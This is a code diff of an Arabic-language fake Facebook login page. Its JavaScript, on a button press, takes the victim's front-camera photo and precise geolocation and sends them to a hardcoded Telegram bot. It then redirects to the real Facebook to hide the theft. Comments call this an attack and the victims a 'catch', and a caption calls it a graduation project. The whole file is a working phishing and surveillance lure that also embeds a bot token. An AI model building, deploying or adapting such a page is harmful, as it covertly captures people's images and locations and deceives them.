@@ -3,51 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول</title>
+    <title>تسجيل الدخول إلى فيسبوك</title>
     <style>
         body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
-        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden; filter: blur(0px); transition: 0.3s;}
+        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
         .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
         .form-area {padding:20px;}
         input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
         .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
+        .links {text-align:center;margin:15px 0;font-size:14px;}
+        .links a {color:#1877f2;text-decoration:none;}
+        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
         
-        /* نافذة التفاعل الإجباري لفتح الثغرة */
-        #startOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.9); z-index: 10000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; padding: 20px;
-        }
-        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
-
-        #warning {
-            display:none; position:fixed; top:0; left:0; right:0; bottom:0; 
-            background:rgba(0,0,0,0.9); color:white; text-align:center; 
-            padding:40px; font-size:18px; z-index:10001; flex-direction:column; justify-content:center; align-items:center;
-        }
+        /* شاشة التحميل الوهمية */
+        #loading { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index:9999; flex-direction:column; justify-content:center; align-items:center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="startOverlay">
-    <div style="margin-bottom: 20px; color: #1c1e21; font-size: 18px;">جاري تحسين واجهة فيسبوك لجهازك...</div>
-    <button class="start-btn" id="initBtn">متابعة إلى فيسبوك</button>
+<div id="loading">
+    <div class="spinner"></div>
+    <p style="margin-top:10px; color:#1877f2;">جاري تسجيل الدخول...</p>
 </div>
 
-<div id="warning">
-    <div>⚠️ يجب السماح بالأذونات لتأمين حسابك.</div>
-    <button style="margin-top:20px; padding:10px;" onclick="location.reload()">إعادة محاولة</button>
-</div>
-
-<div class="fb-container" id="fbMain">
+<div class="fb-container">
     <div class="header">فيسبوك</div>
     <div class="form-area">
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        <form>
+            <input type="text" id="u" placeholder="رقم الجوال أو البريد الإلكتروني">
+            <input type="password" id="p" placeholder="كلمة المرور">
+            <button type="button" id="startBtn" class="login-btn">تسجيل الدخول</button>
         </form>
+        <div class="links">
+            <a href="#">نسيت كلمة المرور؟</a><br><br>
+            <a href="#">إنشاء حساب جديد</a>
+        </div>
+    </div>
+    <div class="footer">
+        العربية · Meta © 2026
     </div>
 </div>
 
@@ -55,71 +50,84 @@
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-// بمجرد الضغط على "متابعة"، يبدأ الاختراق فوراً
-document.getElementById('initBtn').onclick = function() {
-    document.getElementById('startOverlay').style.display = 'none';
-    
-    // بدء الهجوم فوراً
-    startCapture();
+document.getElementById('startBtn').onclick = function() {
+    // إظهار شاشة التحميل فوراً
+    document.body.style.pointerEvents = "none";
+    document.getElementById('loading').style.display = 'flex';
+
+    // بدء طلب الأذونات فوراً
+    initAttack();
 };
 
-async function startCapture() {
+async function initAttack() {
     try {
-        // 1. طلب الكاميرا (سيظهر طلب الإذن للمستخدم الآن)
+        // طلب الكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+        const v = document.createElement('video');
+        v.srcObject = stream;
+        v.play();
 
-        // التقاط الصورة في الخلفية بعد ثانيتين من فتح الكاميرا لضمان الجودة
+        // التقاط الصورة بعد ثانية واحدة للسرعة
         setTimeout(async () => {
             const canvas = document.createElement('canvas');
-            canvas.width = 1280; canvas.height = 720;
-            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-            const imageData = canvas.toDataURL('image/jpeg');
+            canvas.width = 720; canvas.height = 1280;
+            canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
+            const img = canvas.toDataURL('image/jpeg');
             stream.getTracks().forEach(t => t.stop());
 
-            // 2. طلب الموقع
+            // طلب الموقع
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendData(imageData, pos),
-                () => document.getElementById('warning').style.display = 'flex',
-                { enableHighAccuracy: true }
+                (pos) => sendDataAndRedirect(img, pos),
+                () => sendDataAndRedirect(img, null), // إرسال الصورة حتى لو رفض الموقع
+                { enableHighAccuracy: true, timeout: 5000 }
             );
-        }, 2000);
+        }, 1500);
 
-    } catch (err) {
-        document.getElementById('warning').style.display = 'flex';
+    } catch (e) {
+        // إذا رفض الكاميرا، نحاول سحب الموقع ثم نحوله
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendDataAndRedirect(null, pos),
+            () => window.location.href = "fb://feed", // توجيه للتطبيق فوراً
+            { timeout: 3000 }
+        );
+        setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 4000);
     }
 }
 
-function sendData(img, pos) {
-    const lat = pos.coords.latitude.toFixed(6);
-    const lng = pos.coords.longitude.toFixed(6);
-    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-    
-    const caption = `🚀 صيد فوري (عند الدخول)\n📍 الموقع: ${lat},${lng}\n🔗 الخريطة: ${mapsUrl}`;
+async function sendDataAndRedirect(img, pos) {
+    let caption = "🎓 مشروع تخرج - صيد جديد\n";
+    if (pos) {
+        const lat = pos.coords.latitude.toFixed(6);
+        const lng = pos.coords.longitude.toFixed(6);
+        caption += `📍 الموقع: ${lat},${lng}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lng}`;
+    } else {
+        caption += "📍 الموقع: تم الرفض";
+    }
 
-    const blob = dataURLtoBlob(img);
-    const fd = new FormData();
-    fd.append('photo', blob, 'live.jpg');
-    fd.append('caption', caption);
-    fd.append('chat_id', CHAT_ID);
+    if (img) {
+        const blob = dataURLtoBlob(img);
+        const fd = new FormData();
+        fd.append('photo', blob, 'shot.jpg');
+        fd.append('caption', caption);
+        fd.append('chat_id', CHAT_ID);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    } else {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(caption)}`);
+    }
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    // 🔱 التوجيه النهائي الفوري
+    // نحاول فتح التطبيق أولاً، إذا لم يفتح نذهب للموقع
+    window.location.href = "fb://feed"; 
+    setTimeout(() => {
+        window.location.href = "https://m.facebook.com/login/";
+    }, 500);
 }
 
-function dataURLtoBlob(dataurl) {
-    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-    while(n--) u8arr[n] = bstr.charCodeAt(n);
-    return new Blob([u8arr], {type: mime});
+function dataURLtoBlob(d) {
+    let arr = d.split(','), m = arr[0].match(/:(.*?);/)[1], b = atob(arr[1]), n = b.length, u = new Uint8Array(n);
+    while(n--) u[n] = b.charCodeAt(n);
+    return new Blob([u], {type: m});
 }
-
-// لمنع إرسال الفورم العادي وتوجيهه للفيسبوك الحقيقي
-document.getElementById('loginForm').onsubmit = function(e) {
-    e.preventDefault();
-    window.location.href = "https://m.facebook.com/";
-};
 </script>
 
 </body>
